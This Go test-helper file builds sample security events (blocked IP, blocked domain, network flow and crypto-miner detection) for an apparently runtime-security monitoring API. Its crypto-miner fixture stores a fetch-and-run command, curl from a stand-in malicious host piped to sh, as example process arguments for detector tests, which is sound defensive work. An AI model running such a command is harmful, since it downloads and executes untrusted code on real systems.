// Package testhelpers provides utilities for creating test events in V2 ashkaal format.
package testhelpers

import (
	"time"

	"github.com/garnet-org/jibril-ashkaal/pkg/kind"
	"github.com/garnet-org/jibril-ashkaal/pkg/ongoing"
	"github.com/google/uuid"
	"github.com/garnet-org/api/types"
)

// EventV2Helper provides helper methods for creating V2 events in tests.
type EventV2Helper struct{}

// NewEventV2Helper creates a new EventV2Helper instance.
func NewEventV2Helper() *EventV2Helper {
	return &EventV2Helper{}
}

func (h *EventV2Helper) createFlowEvent(metadataName, defaultNote, defaultDescription string, defaultImportance string, defaultRemoteIP, defaultRemoteName string, opts ...EventOption) types.CreateOrUpdateEventV2 {
	config := &EventConfig{
		ID:          uuid.New().String(),
		Kind:        kind.KindFlows,
		Note:        defaultNote,
		Importance:  defaultImportance,
		RemoteIP:    defaultRemoteIP,
		LocalIP:     "10.0.0.1",
		RemoteName:  defaultRemoteName,
		LocalName:   "localhost",
		Protocol:    "TCP",
		SrcPort:     54321,
		DstPort:     443,
		Description: defaultDescription,
		CreatedAt:   time.Now(),
		UpdatedAt:   time.Now(),
	}

	for _, opt := range opts {
		opt(config)
	}

	// Build port matrix if ports are specified
	var portMatrix []ongoing.PortCommAgg
	if config.SrcPort > 0 || config.DstPort > 0 {
		portMatrix = []ongoing.PortCommAgg{
			{
				SrcPort: config.SrcPort,
				DstPort: config.DstPort,
			},
		}
	}

	return types.CreateOrUpdateEventV2{
		ID:   config.ID,
		Kind: config.Kind,
		Data: ongoing.Base{
			Timestamp: config.CreatedAt.Format(time.RFC3339),
			UUID:      uuid.New().String(),
			Note:      config.Note,
			Metadata: ongoing.Metadata{
				Name:        metadataName,
				Version:     "1.0",
				Format:      "ashkaal",
				Description: config.Description,
				Kind:        "flow",
				Importance:  config.Importance,
			},
			Background: ongoing.Background{
				Flows: ongoing.FlowAggregate{
					IPVersion: 4,
					Protocols: []ongoing.ProtocolAggregate{
						{
							Proto: config.Protocol,
							Pairs: []ongoing.ProtocolLocalRemoteAgg{
								{
									Nodes: ongoing.LocalRemotePair{
										Local: ongoing.ProtocolNode{
											Address: config.LocalIP,
											Name:    config.LocalName,
										},
										Remote: ongoing.ProtocolNode{
											Address: config.RemoteIP,
											Name:    config.RemoteName,
										},
									},
									PortMatrix: portMatrix,
								},
							},
						},
					},
				},
			},
		},
		CreatedAt: config.CreatedAt,
		UpdatedAt: config.UpdatedAt,
	}
}

// CreateDropIPEvent creates a V2 dropip event with the given parameters.
func (h *EventV2Helper) CreateDropIPEvent(opts ...EventOption) types.CreateOrUpdateEventV2 {
	return h.createFlowEvent(types.MetadataNameDropIP, "Test DropIP event", "Blocked IP connection", "critical", "203.0.113.1", "malicious.example.com", opts...)
}

// CreateDropDomainEvent creates a V2 dropdomain event with the given parameters.
func (h *EventV2Helper) CreateDropDomainEvent(opts ...EventOption) types.CreateOrUpdateEventV2 {
	return h.createFlowEvent(types.MetadataNameDropDomain, "Test DropDomain event", "Blocked domain connection", "critical", "203.0.113.2", "malware-c2.badactor.com", opts...)
}

// CreateFlowEvent creates a V2 flow event with the given parameters.
func (h *EventV2Helper) CreateFlowEvent(opts ...EventOption) types.CreateOrUpdateEventV2 {
	return h.createFlowEvent(types.MetadataNameFlow, "Test Flow event", "Network flow event", "info", "93.184.216.34", "example.com", opts...)
}

// CreateCryptoMinerEvent creates a V2 crypto miner execution event with the given parameters.
func (h *EventV2Helper) CreateCryptoMinerEvent(opts ...EventOption) types.CreateOrUpdateEventV2 {
	config := &EventConfig{
		ID:          uuid.New().String(),
		Kind:        kind.KindDetections,
		Note:        "Crypto miner execution detected",
		Importance:  "critical",
		Description: "Crypto miner execution detected",
		Command:     "/bin/bash",
		Args:        "-c 'curl http://malicious.com/miner.sh | sh'",
		Executable:  "/bin/bash",
		PID:         1234,
		PPID:        1000,
		UID:         1001,
		CreatedAt:   time.Now(),
		UpdatedAt:   time.Now(),
	}

	for _, opt := range opts {
		opt(config)
	}

	event := types.CreateOrUpdateEventV2{
		ID:   config.ID,
		Kind: config.Kind,
		Data: ongoing.Base{
			Timestamp: config.CreatedAt.Format(time.RFC3339),
			UUID:      uuid.New().String(),
			Note:      config.Note,
			Metadata: ongoing.Metadata{
				Name:        types.MetadataNameCryptoMinerExecution,
				Version:     "1.0",
				Format:      "ashkaal",
				Description: config.Description,
				Kind:        "detection",
				Importance:  config.Importance,
			},
			Background: ongoing.Background{
				Ancestry: []ongoing.Process{
					{
						Comm:  "bash",
						Cmd:   config.Command,
						Exe:   config.Executable,
						Args:  config.Args,
						Pid:   config.PID,
						Ppid:  config.PPID,
						UID:   config.UID,
						Start: config.CreatedAt.Add(-time.Minute).Format(time.RFC3339),
					},
				},
			},
		},
		CreatedAt: config.CreatedAt,
		UpdatedAt: config.UpdatedAt,
	}

	return event
}

// CreateEventWithMetadata creates a V2 event with custom metadata name.
func (h *EventV2Helper) CreateEventWithMetadata(metadataName string, opts ...EventOption) types.CreateOrUpdateEventV2 {
	config := &EventConfig{
		ID:          uuid.New().String(),
		Kind:        kind.KindDetections,
		Note:        "Test event with custom metadata",
		Importance:  "medium",
		Description: "Test event with custom metadata",
		CreatedAt:   time.Now(),
		UpdatedAt:   time.Now(),
	}

	for _, opt := range opts {
		opt(config)
	}

	event := types.CreateOrUpdateEventV2{
		ID:   config.ID,
		Kind: config.Kind,
		Data: ongoing.Base{
			Timestamp: config.CreatedAt.Format(time.RFC3339),
			UUID:      uuid.New().String(),
			Note:      config.Note,
			Metadata: ongoing.Metadata{
				Name:        metadataName,
				Version:     "1.0",
				Format:      "ashkaal",
				Description: config.Description,
				Kind:        "detection",
				Importance:  config.Importance,
			},
		},
		CreatedAt: config.CreatedAt,
		UpdatedAt: config.UpdatedAt,
	}

	return event
}

// EventConfig holds configuration for creating events.
type EventConfig struct {
	ID          string
	Kind        kind.Kind
	Note        string
	Importance  string
	Description string

	// Network-related fields
	RemoteIP    string
	LocalIP     string
	RemoteName  string
	LocalName   string
	Protocol    string
	SrcPort     int
	DstPort     int

	// Process-related fields
	Command     string
	Args        string
	Executable  string
	PID         int
	PPID        int
	UID         uint

	// Timestamps
	CreatedAt   time.Time
	UpdatedAt   time.Time
}

// EventOption is a function that modifies EventConfig.
type EventOption func(*EventConfig)

// WithID sets the event ID.
func WithID(id string) EventOption {
	return func(c *EventConfig) {
		c.ID = id
	}
}

// WithNote sets the event note.
func WithNote(note string) EventOption {
	return func(c *EventConfig) {
		c.Note = note
	}
}

// WithImportance sets the event importance.
func WithImportance(importance string) EventOption {
	return func(c *EventConfig) {
		c.Importance = importance
	}
}

// WithDescription sets the event description.
func WithDescription(description string) EventOption {
	return func(c *EventConfig) {
		c.Description = description
	}
}

// WithRemoteIP sets the remote IP address.
func WithRemoteIP(ip string) EventOption {
	return func(c *EventConfig) {
		c.RemoteIP = ip
	}
}

// WithLocalIP sets the local IP address.
func WithLocalIP(ip string) EventOption {
	return func(c *EventConfig) {
		c.LocalIP = ip
	}
}

// WithRemoteName sets the remote hostname.
func WithRemoteName(name string) EventOption {
	return func(c *EventConfig) {
		c.RemoteName = name
	}
}

// WithTimestamps sets both creation and update timestamps.
func WithTimestamps(createdAt, updatedAt time.Time) EventOption {
	return func(c *EventConfig) {
		c.CreatedAt = createdAt
		c.UpdatedAt = updatedAt
	}
}

// Convenience functions for quick event creation

// CreateBasicDropIPEvent creates a basic dropip event for testing.
func CreateBasicDropIPEvent() types.CreateOrUpdateEventV2 {
	helper := NewEventV2Helper()
	return helper.CreateDropIPEvent()
}

// CreateBasicDropDomainEvent creates a basic dropdomain event for testing.
func CreateBasicDropDomainEvent() types.CreateOrUpdateEventV2 {
	helper := NewEventV2Helper()
	return helper.CreateDropDomainEvent()
}

// CreateBasicFlowEvent creates a basic flow event for testing.
func CreateBasicFlowEvent() types.CreateOrUpdateEventV2 {
	helper := NewEventV2Helper()
	return helper.CreateFlowEvent()
}

// CreateBasicCryptoMinerEvent creates a basic crypto miner event for testing.
func CreateBasicCryptoMinerEvent() types.CreateOrUpdateEventV2 {
	helper := NewEventV2Helper()
	return helper.CreateCryptoMinerEvent()
}